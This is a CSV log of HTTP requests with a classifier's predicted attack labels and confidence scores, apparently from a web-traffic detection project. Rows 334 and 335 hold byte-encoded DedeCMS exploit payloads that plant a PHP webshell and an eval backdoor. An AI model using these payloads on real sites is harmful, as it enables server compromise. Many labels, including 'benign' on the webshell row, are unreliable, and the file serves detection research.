row_idx,text,pred_label,max_prob
334,METHOD=GET PATH=/plus/mytag_js.php QUERY=dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 PROTOCOL=HTTP/1.1,benign,0.48952075839042664
335,METHOD=GET PATH=/plus/download.php QUERY=open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar PROTOCOL=HTTP/1.1,benign,0.4624825716018677
336,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744
337,METHOD=POST PATH=/e/DoInfo/ecms.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.4350149929523468
338,METHOD=GET PATH=/self.logs/access.log.2017-06-01.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4621824622154236
339,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
340,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
341,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
342,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
343,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
344,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
345,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
346,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
347,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
348,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
349,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
350,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
351,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
352,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
353,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
354,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
355,METHOD=GET PATH=/self.logs/error.log.2020-02-20 QUERY= PROTOCOL=HTTP/1.1,benign,0.4985811412334442
356,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
357,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634
358,METHOD=GET PATH=/js/comment.css QUERY= PROTOCOL=HTTP/1.1,benign,0.4877049922943115
359,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
360,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
361,METHOD=GET PATH=/self.logs/access.log.2021-10-03.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45221012830734253
362,METHOD=GET PATH=/self.logs/error.log.2021-10-03.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42285412549972534
363,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
364,METHOD=GET PATH=/self.logs/access.log.2021-10-04.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45710331201553345
365,METHOD=GET PATH=/self.logs/access.log.2021-03-16.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43653756380081177
366,METHOD=GET PATH=/self.logs/error.log.2021-10-04.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4219733774662018
367,METHOD=GET PATH=/self.logs/access.log.2017-03-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44875040650367737
368,METHOD=GET PATH=/self.logs/access.log.2018-03-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45323556661605835
369,METHOD=GET PATH=/self.logs/error.log.2019-05-19.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42895588278770447
370,METHOD=GET PATH=/self.logs/error.log.2020-07-17 QUERY= PROTOCOL=HTTP/1.1,benign,0.5123015642166138
371,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
372,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
373,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
374,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
375,METHOD=GET PATH=/auth.log/auth.log.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5544108152389526
376,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
377,METHOD=HEAD PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6294333338737488
378,METHOD=GET PATH=/tg/tg_snort_full.7z QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4479665458202362
379,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
380,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
381,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
382,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
383,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
384,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
385,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
386,METHOD=GET PATH=/self.logs/error.log.2021-03-22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5126395225524902
387,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
388,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
389,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
390,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
391,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
392,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
393,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
394,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
395,METHOD=GET PATH=/misc/zeus_dga_domains.txt.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6757688522338867
396,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
397,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.0,benign,0.5511705279350281
398,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5995742082595825
399,METHOD=GET PATH=/Datasets%20Description/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.44596144556999207
400,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
401,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
402,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
403,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
404,METHOD=GET PATH=/Datasets%20Description/ QUERY= PROTOCOL=HTTP/1.1,benign,0.4402334690093994
405,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.5944873094558716
406,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5944585800170898
407,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.6243715882301331
408,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5928223133087158
409,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6336460113525391
410,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6225396394729614
411,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6127139329910278
412,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
413,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6414214372634888
414,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.600266695022583
415,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6026156544685364
416,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6194688081741333
417,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6335412263870239
418,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6321981549263
419,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6399790644645691
420,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5978788733482361
421,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6159440279006958
422,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6334364414215088
423,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.586219310760498
424,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5864728689193726
425,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.6111001968383789
426,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5839903950691223
427,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.611397922039032
428,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6011624336242676
429,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5831754803657532
430,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6014771461486816
431,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6182584762573242
432,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5758914947509766
433,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.583132266998291
434,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5959008932113647
435,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.616906464099884
436,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6228588223457336
437,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6193697452545166
438,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.565477728843689
439,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.596772313117981
440,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6161631941795349
441,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.5729430913925171
442,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5728198885917664
443,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.5974732041358948
444,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5708516836166382
445,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5984392762184143
446,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6056768894195557
447,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5792302489280701
448,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5995742082595825
449,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6116724014282227
450,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5747700333595276
451,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5901079773902893
452,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.60698401927948
453,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6020902991294861
454,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6378210186958313
455,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5642861723899841
456,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5964149236679077
457,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6438154578208923
458,METHOD=GET PATH=/Datasets%20Description/Network/N/A QUERY= PROTOCOL=HTTP/1.1,benign,0.5269061923027039
459,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
